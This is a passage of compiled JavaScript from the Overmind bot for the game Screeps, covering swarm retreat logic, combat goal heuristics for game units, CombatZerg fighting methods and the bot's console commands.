                result = this.combatMove(goals.approach, goals.avoid);
            }
            return result;
        }
    }
    needsToRecover(recoverThreshold = 0.75, reengageThreshold = 1.0) {
        let recovering;
        if (this.memory.recovering) {
            recovering = _.any(this.creeps, creep => creep.hits < creep.hitsMax * reengageThreshold);
        }
        else {
            recovering = _.any(this.creeps, creep => creep.hits < creep.hitsMax * recoverThreshold);
        }
        if (recovering && recovering != this.memory.recovering) {
            this.memory.numRetreats++;
        }
        this.memory.recovering = recovering;
        return recovering;
    }
    recover() {
        const allHostiles = _.flatten(_.map(this.rooms, room => room.hostiles));
        const allTowers = _.flatten(_.map(this.rooms, room => room.owner && !room.my ? room.towers : []));
        if (_.filter(allHostiles, h => this.minRangeTo(h)).length > 0 || allTowers.length > 0) {
            this.memory.lastInDanger = Game.time;
        }
        const allAvoidGoals = _.flatten(_.map(this.rooms, room => GoalFinder.retreatGoalsForRoom(room).avoid));
        const result = Movement.swarmCombatMove(this, [], allAvoidGoals);
        if (result == NO_ACTION) {
            const safeRoom = _.first(_.filter(this.rooms, room => !room.owner || room.my));
            if (safeRoom && !this.safelyInRoom(safeRoom.name)) {
                if (Game.time < (this.memory.lastInDanger || 0) + 3) {
                    return this.goToRoom(safeRoom.name);
                }
            }
        }
        return result;
    }
    // Simulated swarms ================================================================================================
    /**
     * Groups enemies into proto-swarms based on proximity to each other
     */
    static findEnemySwarms(room, anchor, maxClumpSize = 3) {
        const enemySwarms = [];
        const origin = anchor || _.first(room.spawns) || room.controller || { pos: new RoomPosition(25, 25, room.name) };
        let attackers = _.sortBy(room.dangerousHostiles, creep => origin.pos.getRangeTo(creep));
        while (attackers.length > 0) {
            const clump = _.first(attackers).pos.findInRange(attackers, maxClumpSize);
            attackers = _.difference(attackers, clump);
            enemySwarms.push({ creeps: clump });
        }
        return enemySwarms;
    }
};
Swarm = __decorate([
    profile
], Swarm);

const DEBUG$1 = false;
let GoalFinder = class GoalFinder {
    // Standard set of goals for fighting small groups of hostiles (not optimal for larger fights)
    static skirmishGoals(creep) {
        const approach = [];
        const avoid = [];
        const room = creep.room;
        const analysis = {};
        const myAttack = CombatIntel.getAttackDamage(creep);
        const myRangedAttack = CombatIntel.getRangedAttackDamage(creep);
        const myHealing = CombatIntel.getHealAmount(creep);
        // If you're purely a healer, ignore combat goals
        if (myHealing > 0 && myAttack == 0 && myRangedAttack == 0) {
            return this.healingGoals(creep);
        }
        const preferCloseCombat = myAttack > 0;
        const myRating = CombatIntel.rating(creep);
        const nearbyRating = _.sum(creep.pos.findInRange(room.creeps, 6), c => CombatIntel.rating(c));
        const braveMode = creep.hits * (nearbyRating / myRating) * .5 > creep.hitsMax;
        const hostileHealers = [];
        // Analyze capabilities of hostile creeps in the room
        for (const hostile of room.hostiles) {
            if (hostile.owner.username == 'Source Keeper')
                continue;
            const attack = CombatIntel.getAttackDamage(hostile);
            const rangedAttack = CombatIntel.getRangedAttackDamage(hostile);
            const healing = CombatIntel.getHealAmount(hostile);
            if (healing > 0 && attack == 0 && rangedAttack == 0) {
                hostileHealers.push(hostile);
            }
            analysis[hostile.id] = {
                attack: attack,
                rangedAttack: rangedAttack,
                heal: healing,
                advantage: healing == 0 || attack + rangedAttack == 0 ||
                    myAttack + myRangedAttack + myHealing / CombatIntel.minimumDamageTakenMultiplier(creep.creep)
                        > attack + rangedAttack + healing / CombatIntel.minimumDamageTakenMultiplier(hostile),
                isRetreating: CombatIntel.isRetreating(hostile, RoomIntel.getPreviousPos(creep)),
                isApproaching: CombatIntel.isApproaching(hostile, RoomIntel.getPreviousPos(creep)),
            };
        }
        // Generate list of targets to approach and respective ranges to keep them at
        const approachTargets = hostileHealers.length > 0 ? hostileHealers : room.hostiles;
        for (const target of approachTargets) {
            const data = analysis[target.id];
            if (data && (data.advantage || braveMode)) {
                let range = 1;
                if (!preferCloseCombat && (data.attack > 0 || data.rangedAttack > myRangedAttack)) {
                    range = creep.pos.getRangeTo(target) == 3 && data.isRetreating ? 2 : 3;
                    avoid.push({ pos: target.pos, range: range });
                }
                approach.push({ pos: target.pos, range: range });
            }
        }
        // If there's nothing left to approach, group up with other creeps
        if (approach.length == 0) {
            for (const friendly of room.creeps) {
                approach.push({ pos: friendly.pos, range: 0 });
            }
        }
        // Avoid hostiles that are significantly better than you
        for (const target of room.hostiles) {
            const data = analysis[target.id];
            if (data && (!data.advantage && !braveMode)) {
                let range = data.isApproaching ? 3 : 2;
                if (data.rangedAttack > 0) {
                    range = 8;
                }
                avoid.push({ pos: target.pos, range: range });
            }
        }
        if (DEBUG$1) {
            log.debug(`Report for ${creep.name}:`, JSON.stringify(analysis));
            log.debug(`Approach for ${creep.name}:`, JSON.stringify(approach));
            log.debug(`Avoid for ${creep.name}:`, JSON.stringify(avoid));
        }
        return { approach, avoid };
    }
    static swarmCombatGoals(swarm, includeStructures = true) {
        const approach = [];
        const avoid = [];
        if (swarm.rooms.length > 1) {
            log.warning(`Swarm in more than 1 room!`);
        }
        // If in more than 1 room, pick the room with more hostile stuff in it
        const room = maxBy(swarm.rooms, room => room.hostiles.length + room.hostileStructures.length);
        const myAttack = _.sum(swarm.creeps, creep => CombatIntel.getAttackDamage(creep));
        const myRangedAttack = _.sum(swarm.creeps, creep => CombatIntel.getRangedAttackDamage(creep));
        const myHealing = _.sum(swarm.creeps, creep => CombatIntel.getHealAmount(creep));
        const myDamageMultiplier = CombatIntel.minimumDamageMultiplierForGroup(_.map(swarm.creeps, c => c.creep));
        const preferCloseCombat = myAttack > myRangedAttack;
        const myRating = _.sum(swarm.creeps, creep => CombatIntel.rating(creep));
        const hostileSwarms = Swarm.findEnemySwarms(room, { pos: swarm.anchor });
        // Analyze capabilities of hostile creeps in the room
        for (const i in hostileSwarms) {
            const hostiles = hostileSwarms[i].creeps;
            const attack = _.sum(hostiles, creep => CombatIntel.getAttackDamage(creep));
            const rangedAttack = _.sum(hostiles, creep => CombatIntel.getRangedAttackDamage(creep));
            const healing = _.sum(hostiles, creep => CombatIntel.getHealAmount(creep));
            const damageMultiplier = CombatIntel.minimumDamageMultiplierForGroup(hostiles);
            const canPopShield = (attack + rangedAttack + CombatIntel.towerDamageAtPos(swarm.anchor)) * myDamageMultiplier
                > _.min(_.map(swarm.creeps, creep => 100 * creep.getActiveBodyparts(TOUGH)));
            const isRetreating = _.sum(hostiles, creep => +CombatIntel.isRetreating(creep, swarm.anchor))
                / hostiles.length >= 0.5;
            const isApproaching = _.sum(hostiles, creep => +CombatIntel.isApproaching(creep, swarm.anchor))
                / hostiles.length >= 0.5;
            const advantage = healing == 0 || attack + rangedAttack == 0 ||
                myAttack + myRangedAttack + myHealing / myDamageMultiplier
                    > attack + rangedAttack + healing / damageMultiplier;
            for (const hostile of hostiles) {
                if (canPopShield && hostile.pos.lookForStructure(STRUCTURE_RAMPART)) {
                    let range = (rangedAttack > attack || !preferCloseCombat ? 3 : 1) + 1;
                    if (CombatIntel.isApproaching(hostile, swarm.anchor)) {
                        range += 1;
                    }
                    avoid.push({ pos: hostile.pos, range: range });
                }
                else {
                    if (advantage) {
                        let range = preferCloseCombat ? 3 : 1;
                        if (!preferCloseCombat && (attack > 0 || rangedAttack > myAttack)) {
                            range = swarm.minRangeTo(hostile) == 3 && isRetreating ? 2 : 3;
                            avoid.push({ pos: hostile.pos, range: range });
                        }
                        approach.push({ pos: hostile.pos, range: range });
                    }
                    else {
                        let range = isApproaching ? 3 : 2;
                        if (rangedAttack > attack) {
                            range = 5;
                        }
                        avoid.push({ pos: hostile.pos, range: range });
                    }
                }
            }
        }
        if (includeStructures) {
            const approachStructures = [];
            for (const structure of room.hostileStructures) {
                approachStructures.push(structure);
            }
            for (const wall of room.walls) {
                approachStructures.push(wall);
            }
            for (const approachStructure of approachStructures) {
                approach.push({ pos: approachStructure.pos, range: 1 });
            }
        }
        if (DEBUG$1) {
            log.debug(`Approach for ${swarm.print}:`, JSON.stringify(approach));
            log.debug(`Avoid for ${swarm.print}:`, JSON.stringify(avoid));
        }
        return { approach, avoid };
    }
    static retreatGoals(creep) {
        const approach = [];
        const avoid = [];
        const isHealer = CombatIntel.isHealer(creep);
        for (const friendly of creep.room.creeps) {
            if (CombatIntel.getHealPotential(friendly) > 0 || (isHealer && isCombatZerg(creep))) {
                approach.push({ pos: friendly.pos, range: 1 });
            }
        }
        for (const hostile of creep.room.hostiles) {
            if (CombatIntel.getAttackPotential(hostile) > 0 || CombatIntel.getRangedAttackPotential(hostile) > 0) {
                avoid.push({ pos: hostile.pos, range: 8 });
            }
        }
        if (creep.room.owner && !creep.room.my) {
            for (const tower of creep.room.towers) {
                avoid.push({ pos: tower.pos, range: 50 });
            }
        }
        return { approach, avoid };
    }
    static retreatGoalsForRoom(room) {
        const avoid = [];
        for (const hostile of room.hostiles) {
            if (CombatIntel.getAttackPotential(hostile) > 0 || CombatIntel.getRangedAttackPotential(hostile) > 0) {
                avoid.push({ pos: hostile.pos, range: 8 });
            }
        }
        if (room.owner && !room.my) {
            for (const tower of room.towers) {
                avoid.push({ pos: tower.pos, range: 50 });
            }
        }
        return { approach: [], avoid: avoid };
    }
    static healingGoals(healer) {
        const approach = [];
        const avoid = [];
        const healAmount = CombatIntel.getHealAmount(healer);
        let target = minBy(_.filter(healer.room.creeps, c => c.hits < c.hitsMax), c => c.hits + healer.pos.getRangeTo(c));
        if (!target) {
            target = minBy(healer.room.creeps, creep => {
                const range = healer.pos.getRangeTo(creep);
                return range > 0 ? CombatIntel.maxFriendlyHealingTo(creep) / healAmount + range : false;
            });
        }
        if (target) {
            approach.push({ pos: target.pos, range: 0 });
        }
        for (const hostile of healer.room.hostiles) {
            const meleeDamage = CombatIntel.getAttackDamage(hostile);
            const rangedDamage = CombatIntel.getRangedAttackDamage(hostile);
            if (meleeDamage + rangedDamage > 0) {
                const range = rangedDamage > healAmount ? 4 : 3;
                avoid.push({ pos: hostile.pos, range: range });
            }
        }
        return { approach, avoid };
    }
    static structureGoals(creep) {
        const approach = [];
        // // TODO: finish this
        // let range = CombatIntel.getAttackDamage(creep) > 0 || CombatIntel.getDismantleDamage(creep) > 0 ? 1 : 3;
        // let structureTarget = CombatTargeting.findBestStructureTarget(creep);
        // if (structureTarget) {
        //  approach.push({pos: structureTarget.pos, range: range});
        // }
        log.error(`NOT IMPLEMENTED`);
        return { approach: approach, avoid: [] };
    }
};
GoalFinder = __decorate([
    profile
], GoalFinder);

const DEFAULT_PARTNER_TICK_DIFFERENCE = 650;
const DEFAULT_SWARM_TICK_DIFFERENCE = 500;
/**
 * CombatZerg is an extension of the Zerg class which contains additional combat-related methods
 */
let CombatZerg = class CombatZerg extends Zerg {
    constructor(creep, notifyWhenAttacked = true) {
        super(creep, notifyWhenAttacked);
        this.isCombatZerg = true;
        _.defaults(this.memory, {
            recovering: false,
            lastInDanger: 0,
            targets: {}
        });
    }
    findPartner(partners, tickDifference = DEFAULT_PARTNER_TICK_DIFFERENCE) {
        if (this.memory.partner) {
            const partner = _.find(partners, partner => partner.name == this.memory.partner);
            if (partner) {
                return partner;
            }
            else {
                delete this.memory.partner;
                this.findPartner(partners, tickDifference);
            }
        }
        else {
            let partner = _.find(partners, partner => partner.memory.partner == this.name);
            if (!partner) {
                partner = _(partners)
                    .filter(partner => !partner.memory.partner &&
                    Math.abs((this.ticksToLive || CREEP_LIFE_TIME)
                        - (partner.ticksToLive || CREEP_LIFE_TIME)) <= tickDifference)
                    .min(partner => Math.abs((this.ticksToLive || CREEP_LIFE_TIME)
                    - (partner.ticksToLive || CREEP_LIFE_TIME)));
            }
            if (_.isObject(partner)) {
                this.memory.partner = partner.name;
                partner.memory.partner = this.name;
                return partner;
            }
        }
    }
    findSwarm(partners, maxByRole, tickDifference = DEFAULT_SWARM_TICK_DIFFERENCE) {
        if (this.memory.swarm) {
            return this.memory.swarm;
        }
        else {
            // Find a swarm that isn't too old and that has space for the creep's role
            const partnersBySwarm = _.groupBy(partners, partner => partner.memory.swarm);
            for (const swarmRef in partnersBySwarm) {
                if (swarmRef == undefined || swarmRef == 'undefined')
                    continue;
                if (_.all(partnersBySwarm[swarmRef], c => Math.abs((this.ticksToLive || CREEP_LIFE_TIME)
                    - (c.ticksToLive || CREEP_LIFE_TIME)) <= tickDifference)) {
                    const swarmCreepsByRole = _.groupBy(partnersBySwarm[swarmRef], c => c.memory.role);
                    if ((swarmCreepsByRole[this.memory.role] || []).length + 1 <= maxByRole[this.memory.role]) {
                        this.memory.swarm = swarmRef;
                        return swarmRef;
                    }
                }
            }
            // Otherwise just make a new swarm ref
            const newSwarmRef = randomHex(6);
            this.memory.swarm = newSwarmRef;
            return newSwarmRef;
        }
    }
    doMedicActions(roomName) {
        // Travel to the target room
        if (!this.safelyInRoom(roomName)) {
            this.goToRoom(roomName, { ensurePath: true });
            return;
        }
        // Heal friendlies
        const target = CombatTargeting.findClosestHurtFriendly(this);
        if (target) {
            // Approach the target
            const range = this.pos.getRangeTo(target);
            if (range > 1) {
                this.goTo(target, { movingTarget: true });
            }
            // Heal or ranged-heal the target
            if (range <= 1) {
                this.heal(target);
            }
            else if (range <= 3) {
                this.rangedHeal(target);
            }
        }
        else {
            this.park();
        }
    }
    healSelfIfPossible() {
        // Heal yourself if it won't interfere with attacking
        if (this.canExecute('heal')
            && (this.hits < this.hitsMax || this.pos.findInRange(this.room.hostiles, 3).length > 0)) {
            return this.heal(this);
        }
    }
    /**
     * Attack and chase the specified target
     */
    attackAndChase(target) {
        let ret;
        // Attack the target if you can, else move to get in range
        if (this.pos.isNearTo(target)) {
            ret = this.attack(target);
            // Move in the direction of the creep to prevent it from running away
            this.move(this.pos.getDirectionTo(target));
            return ret;
        }
        else {
            if (this.pos.getRangeTo(target.pos) > 10 && target instanceof Creep) {
                this.goTo(target, { movingTarget: true });
            }
            else {
                this.goTo(target);
            }
            return ERR_NOT_IN_RANGE;
        }
    }
    // Standard action sequences for engaging small numbers of enemies in a neutral room ===============================
    /**
     * Automatically melee-attack the best creep in range
     */
    autoMelee(possibleTargets = this.room.hostiles) {
        const target = CombatTargeting.findBestCreepTargetInRange(this, 1, possibleTargets)
            || CombatTargeting.findBestStructureTargetInRange(this, 1);
        this.debug(`Melee target: ${target}`);
        if (target) {
            return this.attack(target);
        }
    }
    /**
     * Automatically ranged-attack the best creep in range
     */
    autoRanged(possibleTargets = this.room.hostiles, allowMassAttack = true) {
        const target = CombatTargeting.findBestCreepTargetInRange(this, 3, possibleTargets)
            || CombatTargeting.findBestStructureTargetInRange(this, 3);
        this.debug(`Ranged target: ${target}`);
        if (target) {
            if (allowMassAttack
                && CombatIntel.getMassAttackDamage(this, possibleTargets) > CombatIntel.getRangedAttackDamage(this)) {
                return this.rangedMassAttack();
            }
            else {
                return this.rangedAttack(target);
            }
        }
    }
    /**
     * Automatically heal the best creep in range
     */
    autoHeal(allowRangedHeal = true, friendlies = this.room.creeps) {
        const target = CombatTargeting.findBestHealingTargetInRange(this, allowRangedHeal ? 3 : 1, friendlies);
        this.debug(`Heal taget: ${target}`);
        if (target) {
            if (this.pos.getRangeTo(target) <= 1) {
                return this.heal(target);
            }
            else if (allowRangedHeal && this.pos.getRangeTo(target) <= 3) {
                return this.rangedHeal(target);
            }
        }
    }
    /**
     * Navigate to a room, then engage hostile creeps there, perform medic actions, etc.
     */
    autoSkirmish(roomName, verbose = false) {
        // Do standard melee, ranged, and heal actions
        if (this.getActiveBodyparts(ATTACK) > 0) {
            this.autoMelee(); // Melee should be performed first
        }
        if (this.getActiveBodyparts(RANGED_ATTACK) > 0) {
            this.autoRanged();
        }
        if (this.canExecute('heal')) {
            this.autoHeal(this.canExecute('rangedHeal'));
        }
        // Handle recovery if low on HP
        if (this.needsToRecover()) {
            this.debug(`Recovering!`);
            return this.recover();
        }
        // Travel to the target room
        if (!this.safelyInRoom(roomName)) {
            this.debug(`Going to room!`);
            return this.goToRoom(roomName, { ensurePath: true });
        }
        // Skirmish within the room
        const goals = GoalFinder.skirmishGoals(this);
        this.debug(JSON.stringify(goals));
        return Movement.combatMove(this, goals.approach, goals.avoid);
    }
    /**
     * Navigate to a room, then engage hostile creeps there, perform medic actions, etc.
     */
    autoCombat(roomName, verbose = false) {
        // Do standard melee, ranged, and heal actions
        if (this.getActiveBodyparts(ATTACK) > 0) {
            this.autoMelee(); // Melee should be performed first
        }
        if (this.getActiveBodyparts(RANGED_ATTACK) > 0) {
            this.autoRanged();
        }
        if (this.canExecute('heal')) {
            this.autoHeal(this.canExecute('rangedHeal'));
        }
        // Handle recovery if low on HP
        if (this.needsToRecover()) {
            this.debug(`Recovering!`);
            return this.recover();
        }
        // Travel to the target room
        if (!this.safelyInRoom(roomName)) {
            this.debug(`Going to room!`);
            return this.goToRoom(roomName, { ensurePath: true });
        }
        // Fight within the room
        const target = CombatTargeting.findTarget(this);
        const preferRanged = this.getActiveBodyparts(RANGED_ATTACK) > this.getActiveBodyparts(ATTACK);
        const targetRange = preferRanged ? 3 : 1;
        this.debug(`${target}, ${targetRange}`);
        if (target) {
            const avoid = [];
            // Avoid melee hostiles if you are a ranged creep
            if (preferRanged) {
                const meleeHostiles = _.filter(this.room.hostiles, h => CombatIntel.getAttackDamage(h) > 0);
                for (const hostile of meleeHostiles) {
                    avoid.push({ pos: hostile.pos, range: 2 });
                }
            }
            return Movement.combatMove(this, [{ pos: target.pos, range: targetRange }], []);
        }
    }
    needsToRecover(recoverThreshold = CombatIntel.minimumDamageTakenMultiplier(this.creep) < 1 ? 0.85 : 0.75, reengageThreshold = 1.0) {
        let recovering;
        if (this.memory.recovering) {
            recovering = this.hits < this.hitsMax * reengageThreshold;
        }
        else {
            recovering = this.hits < this.hitsMax * recoverThreshold;
        }
        this.memory.recovering = recovering;
        return recovering;
    }
    /**
     * Retreat and get healed
     */
    recover() {
        if (this.pos.findInRange(this.room.hostiles, 5).length > 0 || this.room.towers.length > 0) {
            this.memory.lastInDanger = Game.time;
        }
        const goals = GoalFinder.retreatGoals(this);
        const result = Movement.combatMove(this, goals.approach, goals.avoid, { allowExit: true });
        if (result == NO_ACTION && this.pos.isEdge) {
            if (Game.time < this.memory.lastInDanger + 3) {
                return this.moveOffExit();
            }
        }
        return result;
    }
};
CombatZerg = __decorate([
    profile
], CombatZerg);

// Sandbox code: lets you try out random stuff at the end of main loop
// import {tftest} from './reinforcementLearning/test'
function sandbox() {
    try {
        // tftest();
    }
    catch (e) {
        log.error(e);
    }
}

/**
 * OvermindConsole registers a number of global methods for direct use in the Screeps console
 */
class OvermindConsole {
    static init() {
        global.help = this.help();
        global.info = this.info;
        global.notifications = this.notifications;
        global.debug = this.debug;
        global.stopDebug = this.stopDebug;
        global.setMode = this.setMode;
        global.setSignature = this.setSignature;
        global.print = this.print;
        global.timeit = this.timeit;
        global.setLogLevel = log.setLogLevel;
        global.suspendColony = this.suspendColony;
        global.unsuspendColony = this.unsuspendColony;
        global.openRoomPlanner = this.openRoomPlanner;
        global.closeRoomPlanner = this.closeRoomPlanner;
        global.cancelRoomPlanner = this.cancelRoomPlanner;
        global.listActiveRoomPlanners = this.listActiveRoomPlanners;
        global.destroyErrantStructures = this.destroyErrantStructures;
        global.destroyAllHostileStructures = this.destroyAllHostileStructures;
        global.destroyAllBarriers = this.destroyAllBarriers;
        global.listConstructionSites = this.listConstructionSites;
        global.listDirectives = this.listDirectives;
        global.listPersistentDirectives = this.listPersistentDirectives;
        global.removeAllLogisticsDirectives = this.removeAllLogisticsDirectives;
        global.removeFlagsByColor = this.removeFlagsByColor;
        global.removeErrantFlags = this.removeErrantFlags;
        global.deepCleanMemory = this.deepCleanMemory;
        global.startRemoteDebugSession = this.startRemoteDebugSession;
        global.endRemoteDebugSession = this.endRemoteDebugSession;
        global.profileMemory = this.profileMemory;
        global.cancelMarketOrders = this.cancelMarketOrders;
    }
    // Help, information, and operational changes ======================================================================
    static help() {
        let msg = '\n<font color="#ff00ff">';
        for (const line of asciiLogoSmall) {
            msg += line + '\n';
        }
        msg += '</font>';
        const descr = {};
        descr.help = 'show this message';
        descr['info()'] = 'display version and operation information';
        descr['notifications()'] = 'print a list of notifications with hyperlinks to the console';
        descr['setMode(mode)'] = 'set the operational mode to "manual", "semiautomatic", or "automatic"';
        descr['setSignature(newSignature)'] = 'set your controller signature; no argument sets to default';
        descr['print(...args[])'] = 'log stringified objects to the console';
        descr['debug(thing)'] = 'enable debug logging for a game object or process';
        descr['stopDebug(thing)'] = 'disable debug logging for a game object or process';
        descr['timeit(function, repeat=1)'] = 'time the execution of a snippet of code';
        descr['setLogLevel(int)'] = 'set the logging level from 0 - 4';
        descr['suspendColony(roomName)'] = 'suspend operations within a colony';
        descr['unsuspendColony(roomName)'] = 'resume operations within a suspended colony';
        descr['openRoomPlanner(roomName)'] = 'open the room planner for a room';
        descr['closeRoomPlanner(roomName)'] = 'close the room planner and save changes';
        descr['cancelRoomPlanner(roomName)'] = 'close the room planner and discard changes';
        descr['listActiveRoomPlanners()'] = 'display a list of colonies with open room planners';
        descr['destroyErrantStructures(roomName)'] = 'destroys all misplaced structures within an owned room';
        descr['destroyAllHostileStructures(roomName)'] = 'destroys all hostile structures in an owned room';
        descr['destroyAllBarriers(roomName)'] = 'destroys all ramparts and barriers in a room';
        descr['listConstructionSites(filter?)'] = 'list all construction sites matching an optional filter';
        descr['listDirectives(filter?)'] = 'list directives, matching a filter if specified';
        descr['listPersistentDirectives()'] = 'print type, name, pos of every persistent directive';
        descr['removeFlagsByColor(color, secondaryColor)'] = 'remove flags that match the specified colors';
        descr['removeErrantFlags()'] = 'remove all flags which don\'t match a directive';
        descr['deepCleanMemory()'] = 'deletes all non-critical portions of memory (be careful!)';
        descr['profileMemory(depth=1)'] = 'scan through memory to get the size of various objects';
        descr['startRemoteDebugSession()'] = 'enables the remote debugger so Muon can debug your code';
        descr['cancelMarketOrders(filter?)'] = 'cancels all market orders matching filter (if provided)';
        // Console list
        const descrMsg = toColumns(descr, { justify: true, padChar: '.' });
        const maxLineLength = _.max(_.map(descrMsg, line => line.length)) + 2;
        msg += 'Console Commands: '.padRight(maxLineLength, '=') + '\n' + descrMsg.join('\n');
        msg += '\n\nRefer to the repository for more information\n';
        return msg;
    }
    static printUpdateMessage(aligned = false) {
        const joinChar = aligned ? alignedNewline : '\n';
        const msg = `Codebase updated or global reset. Type "help" for a list of console commands.` + joinChar +
            color(asciiLogoSmall.join(joinChar), '#ff00ff') + joinChar +
            OvermindConsole.info(aligned);
        log.alert(msg);
    }
    static printTrainingMessage() {
        console.log('\n' + asciiLogoRL.join('\n') + '\n');
    }
    static info(aligned = false) {
        const b = bullet;
        const checksum = Assimilator.generateChecksum();
        const clearanceCode = Assimilator.getClearanceCode(MY_USERNAME);
        const baseInfo = [
            `${b}Version:        Overmind v${__VERSION__}`,
            `${b}Checksum:       ${checksum}`,
            `${b}Assimilated:    ${clearanceCode ? 'Yes' : 'No'} (clearance code: ${clearanceCode}) [WIP]`,
            `${b}Operating mode: ${Memory.settings.operationMode}`,
        ];
        const joinChar = aligned ? alignedNewline : '\n';
        return baseInfo.join(joinChar);
    }
    static notifications() {
        const notifications = Overmind.overseer.notifier.generateNotificationsList(true);
        return _.map(notifications, msg => bullet + msg).join('\n');
    }
    static setMode(mode) {
        switch (mode) {
            case 'manual':
                Memory.settings.operationMode = 'manual';
                return `Operational mode set to manual. Only defensive directives will be placed automatically; ` +
                    `remove harvesting, claiming, room planning, and raiding must be done manually.`;
            case 'semiautomatic':
                Memory.settings.operationMode = 'semiautomatic';
                return `Operational mode set to semiautomatic. Claiming, room planning, and raiding must be done ` +
                    `manually; everything else is automatic.`;
            case 'automatic':
                Memory.settings.operationMode = 'automatic';
                return `Operational mode set to automatic. All actions are done automatically, but manually placed ` +
                    `directives will still be responded to.`;
            default:
                return `Invalid mode: please specify 'manual', 'semiautomatic', or 'automatic'.`;
        }
    }
    static setSignature(signature) {
        const sig = signature ? signature : DEFAULT_OVERMIND_SIGNATURE;
        if (sig.length > 100) {
            throw new Error(`Invalid signature: ${signature}; length is over 100 chars.`);
        }
        else if (sig.toLowerCase().includes('overmind') || sig.includes(DEFAULT_OVERMIND_SIGNATURE)) {
            Memory.settings.signature = sig;
            return `Controller signature set to ${sig}`;
        }
        else {
            throw new Error(`Invalid signature: ${signature}; must contain the string "Overmind" or ` +
                `${DEFAULT_OVERMIND_SIGNATURE} (accessible on global with __DEFAULT_OVERMIND_SIGNATURE__)`);
        }
    }
    // Debugging methods ===============================================================================================
    static debug(thing) {
        thing.memory.debug = true;
        return `Enabled debugging for ${thing.name}.`;
    }
    static stopDebug(thing) {
        delete thing.memory.debug;
        return `Disabled debugging for ${thing.name}.`;
    }
    static startRemoteDebugSession() {
        global.remoteDebugger.enable();
        return `Started remote debug session.`;
    }
    static endRemoteDebugSession() {
        global.remoteDebugger.disable();
        return `Ended remote debug session.`;
    }
    static print(...args) {
        for (const arg of args) {
            let cache = [];
            const msg = JSON.stringify(arg, function (key, value) {
                if (typeof value === 'object' && value !== null) {
                    if (cache.indexOf(value) !== -1) {
                        // Duplicate reference found
                        try {
                            // If this value does not reference a parent it can be deduped
                            return JSON.parse(JSON.stringify(value));
                        }
                        catch (error) {
                            // discard key if value cannot be deduped
                            return;
                        }
                    }
                    // Store value in our collection
                    cache.push(value);
                }
                return value;
            }, '\t');
            cache = null;
            console.log(msg);
        }
        return 'Done.';
    }
    static timeit(callback, repeat = 1) {
        let start, used, i;
        start = Game.cpu.getUsed();
        for (i = 0; i < repeat; i++) {
            callback();
        }
        used = Game.cpu.getUsed() - start;
        return `CPU used: ${used}. Repetitions: ${repeat} (${used / repeat} each).`;
    }
    // Colony suspension ===============================================================================================
    static suspendColony(roomName) {
        if (Overmind.colonies[roomName]) {
            const colonyMemory = Memory.colonies[roomName];
            if (colonyMemory) {
                colonyMemory.suspend = true;
                Overmind.shouldBuild = true;
                return `Colony ${roomName} suspended.`;
            }
            else {
                return `No colony memory for ${roomName}!`;
            }
        }
        else {
            return `Colony ${roomName} is not a valid colony!`;
        }
    }
    static unsuspendColony(roomName) {
        const colonyMemory = Memory.colonies[roomName];
        if (colonyMemory) {
            if (!colonyMemory.suspend) {
                return `Colony ${roomName} is not suspended!`;
            }
            else {
                delete colonyMemory.suspend;
                Overmind.shouldBuild = true;
                return `Colony ${roomName} unsuspended.`;
            }
        }
        else {
            return `No colony memory for ${roomName}!`;
        }
    }
    // Room planner control ============================================================================================
    static openRoomPlanner(roomName) {
        if (Overmind.colonies[roomName]) {
            if (Overmind.colonies[roomName].roomPlanner.active != true) {
                Overmind.colonies[roomName].roomPlanner.active = true;
                return '';
            }
            else {
                return `RoomPlanner for ${roomName} is already active!`;
            }
        }
        else {
            return `Error: ${roomName} is not a valid colony!`;
        }
    }
    static closeRoomPlanner(roomName) {
        if (Overmind.colonies[roomName]) {
            if (Overmind.colonies[roomName].roomPlanner.active) {
                Overmind.colonies[roomName].roomPlanner.finalize();
                return '';
            }
            else {
                return `RoomPlanner for ${roomName} is not active!`;
            }
        }
        else {
            return `Error: ${roomName} is not a valid colony!`;
        }
    }
    static cancelRoomPlanner(roomName) {
        if (Overmind.colonies[roomName]) {
            if (Overmind.colonies[roomName].roomPlanner.active) {
                Overmind.colonies[roomName].roomPlanner.active = false;
                return `RoomPlanner for ${roomName} has been deactivated without saving changes`;
            }
            else {
                return `RoomPlanner for ${roomName} is not active!`;
            }
        }
        else {
            return `Error: ${roomName} is not a valid colony!`;
        }
    }
    static listActiveRoomPlanners() {
        const coloniesWithActiveRoomPlanners = _.filter(_.map(_.keys(Overmind.colonies), colonyName => Overmind.colonies[colonyName]), (colony) => colony.roomPlanner.active);
        const names = _.map(coloniesWithActiveRoomPlanners, colony => colony.room.print);
        if (names.length > 0) {
            console.log('Colonies with active room planners: ' + names);
            return '';
        }
        else {
            return `No colonies with active room planners`;
        }
    }
    static listConstructionSites(filter) {
        let msg = `${_.keys(Game.constructionSites).length} construction sites currently present: \n`;
        for (const id in Game.constructionSites) {
            const site = Game.constructionSites[id];
            if (!filter || filter(site)) {
                msg += `${bullet}Type: ${site.structureType}`.padRight(20) +
                    `Pos: ${site.pos.print}`.padRight(65) +
                    `Progress: ${site.progress} / ${site.progressTotal} \n`;
            }
        }
        return msg;
    }
    // Directive management ============================================================================================
    static listDirectives(filter) {
        let msg = '';
        for (const i in Overmind.directives) {
            const dir = Overmind.directives[i];
            if (!filter || filter(dir)) {
                msg += `${bullet}Name: ${dir.print}`.padRight(70) +
                    `Colony: ${dir.colony.print}`.padRight(55) +
                    `Pos: ${dir.pos.print}\n`;
            }
        }
        return msg;
    }
    static removeAllLogisticsDirectives() {
        const logisticsFlags = _.filter(Game.flags, flag => flag.color == COLOR_YELLOW &&
            flag.secondaryColor == COLOR_YELLOW);
        for (const dir of logisticsFlags) {
            dir.remove();
        }
        return `Removed ${logisticsFlags.length} logistics directives.`;
    }
    static listPersistentDirectives() {
        let msg = '';
        for (const i in Overmind.directives) {
            const dir = Overmind.directives[i];
            if (dir.memory.persistent) {
                msg += `Type: ${dir.directiveName}`.padRight(20) +
                    `Name: ${dir.name}`.padRight(15) +
                    `Pos: ${dir.pos.print}\n`;
            }
        }
        return msg;
    }
    static removeFlagsByColor(color$$1, secondaryColor) {
        const removeFlags = _.filter(Game.flags, flag => flag.color == color$$1 && flag.secondaryColor == secondaryColor);
        for (const flag of removeFlags) {
            flag.remove();
        }
        return `Removed ${removeFlags.length} flags.`;
    }
    static removeErrantFlags() {
        // This may need to be be run several times depending on visibility
        if (USE_PROFILER) {
            return `ERROR: should not be run while profiling is enabled!`;
        }
        let count = 0;
        for (const name in Game.flags) {
            if (!Overmind.directives[name]) {
                Game.flags[name].remove();
                count += 1;
            }
        }
        return `Removed ${count} flags.`;
    }
    // Structure management ============================================================================================
